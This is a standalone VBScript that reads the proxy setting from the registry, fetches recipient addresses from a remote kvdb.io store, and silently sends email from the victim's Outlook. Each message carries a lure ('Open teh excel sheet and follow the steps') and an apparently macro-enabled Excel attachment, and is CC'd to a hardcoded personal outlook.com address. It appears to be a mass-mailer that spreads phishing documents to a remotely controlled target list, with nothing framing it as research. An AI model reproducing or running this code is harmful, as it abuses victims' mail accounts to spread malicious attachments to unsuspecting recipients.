function read_reg(key)
	Dim windowsShell
	Dim regValue
	Set windowsShell = CreateObject("WScript.Shell")
	regValue = windowsShell.RegRead(key)
	read_reg=regValue
	'Wscript.Echo regValue
end function

function pull()
		proxy=read_reg("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer")
		res="FQM3hbtRhm94tkaLXBm5kF"
		res_key=res
		updated_ep="https://kvdb.io/"&res_key&"/names"
		URL=updated_ep
		Set objXmlHttpMain = CreateObject("Msxml2.ServerXMLHTTP.6.0")
		if proxy <> "" then
			objXmlHttpMain.setProxy 2, proxy ,""
		end if
		
		objXmlHttpMain.open "GET",URL
		objXmlHttpMain.send
		resp=objXmlHttpMain.responseText
		pull=resp
end function		
		
function send_email()
   Set objOutlook = CreateObject("Outlook.Application")
   Set objMail = objOutlook.CreateItem(0)
   objMail.Display
   to_details=pull()
   if to_details <> "" then
		to_address=Split(to_details,",")
		for each add in to_address
			objMail.RecipIents.Add(add)
		next
		
   else
		objMail.To = "furqankhan008@outlook.com"
   End If
   
   objMail.cc = "furqankhan008@outlook.com"
   objMail.Subject = "Automation Details As discussed"
   objMail.Body = "As discussed , kinldy find the automation overlay attached with the email. Open teh excel sheet and follow the steps."
   
   objMail.Attachments.Add "D:\A.xlxm" 
   objMail.Send  
   Set objMail = Nothing
   Set objOutlook = Nothing
	
  
end function
send_email()
